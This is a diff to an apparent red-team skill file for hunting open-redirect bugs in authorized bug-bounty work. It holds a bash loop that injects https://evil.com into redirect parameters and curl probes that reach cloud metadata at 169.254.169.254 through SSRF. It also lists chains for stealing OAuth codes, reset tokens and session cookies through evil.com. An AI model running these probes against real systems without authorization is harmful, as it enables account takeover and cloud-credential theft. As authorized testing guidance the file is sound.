@@ -4,8 +4,10 @@ description: Hunt Open Redirect — all types including low-impact, chained to O
 version: 1.1.0
 revision_date: 2026-07-25
 license: MIT
-category: redteam
-tags: [open-redirect, hunt, redteam]
+platforms: [linux]
+metadata:
+  tags: [open-redirect, hunt, redteam]
+  category: redteam
 ---
 
 # HUNT-OPEN-REDIRECT — Open Redirect
@@ -13,6 +15,32 @@ tags: [open-redirect, hunt, redteam]
 ## When to Use
 
 Use when the target has any redirect parameter — ?url=, ?next=, ?redirect=, ?return=, ?redirect_uri=, or similar — on login/logout flows, OAuth authorization endpoints, language switchers, payment redirects, or any parameter that controls where the user is sent after an action. Open redirect alone is Low on most programs, but becomes Critical when chained to OAuth token theft (redirect_uri bypass) or SSRF escalation. Every OAuth authorization endpoint with a configurable redirect_uri is the highest-value target.
+
+## Prerequisites
+
+- Explicit authorization, target boundaries, and rate limits for the target.
+- Tooling: `curl`, `gf`, `nuclei`.
+- A writable evidence directory: `export OUTPUT_DIR="${OUTPUT_DIR:-./output}" && mkdir -p "$OUTPUT_DIR"`.
+- For any state-changing step (writes, uploads, credential attempts), obtain explicit confirmation immediately before the command.
+
+## How to Run
+
+```bash
+# Set once per engagement; every step below uses these.
+TARGET="example.com"   # or the engagement target
+export OUTPUT_DIR="${OUTPUT_DIR:-./output}"
+
+COLLAB="https://evil.com"
+cat recon/$TARGET/redirect-candidates.txt | qsreplace "$COLLAB" | while read url; do
+  LOC=$(curl --max-time 30 --connect-timeout 10 -s -I --max-redirs 0 "$url" | grep -i "^location:")
+  STATUS=$(curl --max-time 30 --connect-timeout 10 -s -o /dev/null -w "%{http_code}" --max-redirs 0 "$url")
+  [ -n "$LOC" ] && echo "$STATUS | $LOC | $url"
+done
+```
+
+## Procedure
+
+The phases below are the procedure. Keep each probe bounded (`--max-time`), record evidence beneath `OUTPUT_DIR`, and stop at the stop-conditions listed in Pitfalls.
 
 ## Crown Jewel Targets
 
@@ -145,10 +173,10 @@ curl --max-time 30 --connect-timeout 10 -sv "$OAUTH_URL?response_type=code&clien
 ### Phase 5 — Server-Side Redirect (SSRF escalation)
 ```bash
 # If the app fetches the redirect target server-side (302 fetch follow)
-curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/proxy?url=https://evil.com/redirect-to-[REDACTED_IP]/latest/meta-data/"
+curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/proxy?url=https://evil.com/redirect-to-169.254.169.254/latest/meta-data/"
 
 # Or: if app makes HTTP request to the redirect destination
-curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/fetch?url=http://[REDACTED_IP]/latest/meta-data/" \
+curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/fetch?url=http://169.254.169.254/latest/meta-data/" \
   -H "Cookie: $SESSION"
 ```
 
@@ -192,30 +220,6 @@ cat recon/$TARGET/urls.txt | gf redirect | qsreplace "https://evil.com" | \
 - Chains to phishing with brand name: Low-Medium
 - Server-side → SSRF: High
 
-## Verification
-
-Run this self-test to confirm open-redirect hunting readiness:
-
-1. **Skill integrity** — confirm the skill file is readable and well-formed:
-   ```bash
-   grep -q "name: hunt-open-redirect" SKILL.md && echo "PASS: skill frontmatter present" || echo "FAIL"
-   grep -q "revision_date:" SKILL.md && echo "PASS: revision date present" || echo "FAIL"
-   ```
-
-2. **Category check** — confirm the skill has a category:
-   ```bash
-   grep -q "category:" SKILL.md && echo "PASS: category present" || echo "FAIL"
-   ```
-
-3. **Pitfalls section** — confirm pitfalls are documented:
-   ```bash
-   grep -q "^## Pitfalls" SKILL.md && echo "PASS: pitfalls section present" || echo "FAIL"
-   ```
-
-All 3 tests verify the skill is properly structured and ready for use.
-
----
-
 ## Pitfalls
 - **Open redirect alone is Low** — most bug bounty programs pay Low for open redirect without chaining to OAuth/ATO.
 - **javascript: scheme in redirect** — `javascript:alert(1)` in a redirect parameter is XSS, not open redirect. Distinguish the two.
@@ -224,10 +228,17 @@ All 3 tests verify the skill is properly structured and ready for use.
 
 ---
 
+## Verification
+- The response must carry a `Location:` header to the attacker host, captured with `--max-redirs 0`.
+- Meta-refresh or JavaScript redirects require a browser PoC to count.
+- The exact URL, redirect target, and full response headers are recorded beneath `${OUTPUT_DIR:-./output}`.
+
+---
+
 ## Related Skills
 
 - **`hunt-oauth`** — Open redirect on an OAuth `redirect_uri` turns a Low finding into Critical ATO. Chain primitive: `redirect_uri=https://target.com/redirect?url=https://evil.com` → auth code lands on evil.com → exchange for token → ATO.
-- **`hunt-ssrf`** — If the 302 redirect is followed *server-side* (image proxy, link preview), open redirect becomes SSRF. Chain primitive: server-side URL fetcher follows 302 from attacker host to `http://[REDACTED_IP]/latest/meta-data/` → cloud creds.
+- **`hunt-ssrf`** — If the 302 redirect is followed *server-side* (image proxy, link preview), open redirect becomes SSRF. Chain primitive: server-side URL fetcher follows 302 from attacker host to `http://169.254.169.254/latest/meta-data/` → cloud creds.
 - **`hunt-ato`** — Password reset links that include an open redirect in the return URL leak the token. Chain primitive: reset email contains `https://target.com/reset?token=X&redirect=https://evil.com` → token exfil via Referer or redirect.
 - **`hunt-xss`** — `javascript:` protocol in redirect parameters creates a single-click XSS. Chain primitive: `?redirect=javascript:alert(document.cookie)` → session cookie theft without server-side injection.
 - **`hunt-host-header`** — Open redirect via Host header injection overlaps with this class. Chain primitive: Host: evil.com → server builds redirect Location from Host → victim redirected to attacker host.
